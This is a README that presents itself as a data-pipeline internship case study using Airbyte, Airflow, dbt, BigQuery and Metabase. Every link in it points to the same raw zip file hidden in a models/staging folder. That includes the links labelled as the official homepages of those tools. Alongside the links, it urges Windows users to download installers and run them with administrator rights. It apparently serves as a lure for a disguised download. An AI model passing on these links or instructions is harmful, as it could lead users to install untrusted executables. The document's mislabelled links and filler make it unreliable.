# ⚙️ data-engineering-wf-internship-case-study - Simple Data Pipeline Guide

[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip)

---

## 📋 About This Project

This project shows how to build a data pipeline from start to finish. You will see how to move data step-by-step using common tools and platforms. It covers Airbyte for data extraction, Airflow for workflow management, dbt for data transformation, BigQuery for storage, and Metabase for data visualization.

The package includes diagrams, ready-to-use workflows (DAGs), and SQL examples to help you understand each stage.

This repository aims to teach data engineering concepts through practical application.

---

## 🖥️ System Requirements

To run this software on your Windows computer, make sure your system meets these requirements:

- Windows 10 or later (64-bit)
- At least 8 GB RAM
- 10 GB free disk space
- Internet connection for downloading components and updates
- Administrator rights for installation steps

This setup uses multiple tools that may run locally or connect to cloud services. Some may need a Google account for BigQuery or access to Metabase servers.

---

## 🔽 Download and Install the Application

You will find everything needed in the release section. Because this project relies on several components, downloading here provides the setup files and instructions you need.

### Step 1: Open the Download Page

Click the link below to open the releases page:

[![Download Releases Page](https://img.shields.io/badge/Go_to-Download_Page-blue?style=for-the-badge)](https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip)

This page lists all recent versions. Look for the latest stable release. You will find setup files and documents needed to run the project.

### Step 2: Download Files

Select the most recent release folder. Usually, it has a name like `v1.x`.

Inside the release folder, find and download these items:

- Installer or executable files for Windows (if available)
- Documentation or README files for local use
- Sample data or configuration files

Save them in a folder on your computer where you want the software to be installed.

### Step 3: Install Required Software

This project uses several tools that may need to be installed separately.

- **Airbyte**: Used to extract data. You can use the Airbyte cloud or install it on Windows using Docker or Windows Subsystem for Linux (WSL).
- **Airflow**: Manages workflows. It may require Python and setup via command line.
- **dbt (data build tool)**: Runs SQL models. It needs Python and basic setup.
- **BigQuery**: A cloud data warehouse. Access requires a Google Cloud account.
- **Metabase**: Visualizes data. You can run it locally or use a web version.

If you choose to install these tools locally:

1. Install **Docker Desktop** for Windows. It simplifies installing Airbyte and often Airflow.
2. Install **Python 3.8 or newer**. This is needed for Airflow and dbt.
3. Follow the links in the documentation files downloaded to get setup guides specific to each tool.

### Step 4: Configure the Project

After installing the necessary software, configure your environment.

- Load the sample configurations provided with the download.
- Set connection details for BigQuery in your Google Cloud account.
- Update any file paths in configuration files to match your system locations.
- Use the provided SQL and DAG files to understand how data moves.

### Step 5: Run the Application

To start,

- Launch Airbyte to extract sample data and load it into staging.
- Use Airflow to run workflows that transform data.
- Run dbt commands to build transformations in BigQuery.
- Open Metabase to view your results and reports.

Run commands or start services as described in documentation to see the workflow in action.

---

## 🛠️ How to Use This Project

This repository helps you learn data engineering by doing.

1. **Understand the flow**. Learn what each tool does at each stage.
2. **Explore files**. Open and read YAML and SQL files in the project folder.
3. **Run workflows**. Use Airflow to automate steps from extraction to reporting.
4. **View outputs**. Look in BigQuery and Metabase to see your data results.

Use this guide and the provided files to try small changes. For example, edit SQL queries or add new Airflow tasks.

---

## ⚙️ Tools Explained

### Airbyte

Airbyte extracts data from multiple sources. It moves data into the initial storage or staging area. It simplifies connecting to many types of data sources.

### Airflow

Airflow controls the flow of tasks. It schedules and runs each step automatically in the right order. You can track progress and troubleshoot failures.

### dbt

dbt transforms raw data into clean, analysis-ready tables using SQL scripts. It uses version control and testing to ensure data quality.

### BigQuery

BigQuery stores the final data sets. It is a fast cloud warehouse for running queries at scale.

### Metabase

Metabase provides simple dashboards and reports. It connects to BigQuery and shows data visually without coding.

---

## 📁 Files Included

- **Diagrams**: Visual guides of the data flow and pipeline structure.
- **DAG files**: Airflow workflows you can load and run.
- **SQL examples**: dbt models and queries to run and modify.
- **Configuration files**: Settings for each tool and connection info.
- **Documentation**: Step-by-step instructions and setup tips.

---

## ❓ Troubleshooting

If you see errors during installation or running:

- Check if all required software is installed properly.
- Verify internet connection for cloud services.
- Review configuration files for correct settings.
- Look at Airflow logs and tool outputs for error messages.
- Restart services if needed.

Online support forums for each tool are helpful for detailed errors.

---

## 🔗 Useful Links

- Download releases: https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip
- Airbyte homepage: https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip
- Apache Airflow: https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip
- dbt documentation: https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip
- Google BigQuery: https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip
- Metabase site: https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip

---

## 📝 Topics Covered

This project includes work with:

airbyte, airflow, analytics engineering, bigquery, data pipelines, data architecture, dbt, etl, gcp, metabase, python

---

For updates and downloads, visit the release page:

[Download Latest Release](https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip)